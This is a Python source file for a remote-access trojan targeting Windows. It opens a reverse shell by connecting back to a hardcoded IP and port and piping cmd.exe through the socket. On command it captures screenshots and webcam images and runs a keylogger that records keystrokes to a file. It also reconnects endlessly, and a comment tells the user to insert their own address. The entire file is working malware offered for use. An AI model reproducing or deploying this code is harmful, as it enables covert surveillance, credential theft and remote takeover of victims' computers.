import socket,subprocess,threading,pygame,pyscreenshot,datetime,re,pygame.camera
from pynput.keyboard import Listener

def send_data_to_process(process,data):
    process.stdin.write(data)
    process.stdin.flush()

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

def keylogger():
    with Listener(on_press=log_keystroke) as l:
        l.join()

def screenshot():
    image = pyscreenshot.grab()
    date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
    filename="screenshot-"+date+".png"
    image.save(filename)
    return filename

def cam_capture(cam_id):
    cam = pygame.camera.Camera(cam_id,(1280,720))
    cam.start()
    image = cam.get_image()
    date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
    filename="cam-"+date+".png"
    pygame.image.save(image,filename)
    return filename

def receive_data(s, p):
    try:
        pygame.init()
        pygame.camera.init()
        keylogger_thread = threading.Thread(target=keylogger,daemon=True)
        while 1:
            data = s.recv(1024)
            if len(data) > 0:
                if data.decode() == "stop\n": #stop the child process and loop in try_to_connect function
                    p.terminate()
                elif data.decode() == "ss\n": #save a screenshot of the screen
                    filename = screenshot()
                    send_data_to_process(p,("image saved: "+filename+"\n").encode())
                elif data.decode() == "list\n": #send a list of cameras
                    data = ""
                    for cam in pygame.camera.list_cameras():
                        data=data+str(cam)+"\n"
                    send_data_to_process(p,data.encode())
                elif re.match(r"^capture [0-9]$",data.decode()): #save a picture of camera
                    cam_id = data.decode().replace("capture ","").rstrip("\n")
                    cam_id = int(cam_id)
                    if cam_id in pygame.camera.list_cameras():
                        filename = cam_capture(cam_id)
                        send_data_to_process(p,("image saved"+filename+"\n").encode())
                    else:
                        send_data_to_process(p,"No cam with this id\n".encode())
                elif data.decode() == "key start\n": #Start the keylogger
                    if not keylogger_thread.is_alive():
                        keylogger_thread.start()
                        send_data_to_process(p,"Keylogger started\n".encode())
                    else:
                        send_data_to_process(p,"Keylogger is already running\n".encode())
                elif data.decode() == "key stop\n": #Stop the keylogger
                    keylogger_thread.join(1)
                    send_data_to_process(p,"Keylogger is stopped\n".encode())
                else:
                    send_data_to_process(p,data)
    except:
        pass

def send_data(s, p):
    try:
        while 1:
            s.send(p.stdout.read(1))
    except:
        pass


def launching_process(ip,port,s):
    p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
    receive_thread = threading.Thread(target=receive_data, args=[s, p],daemon=True)
    receive_thread.start()

    send_thread = threading.Thread(target=send_data, args=[s, p],daemon=True)
    send_thread.start()

    p.wait()
    if send_thread.is_alive():
        send_thread.join(0)
    if receive_thread.is_alive():
        receive_thread.join(0)
    s.close()
    try_to_connect(ip,port)

def try_to_connect(ip,port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((ip,port))
        launching_process(ip,port,s)
    except:
        try_to_connect(ip,port)

try_to_connect("192.168.0.16",4444) #Here you put your ip address and your port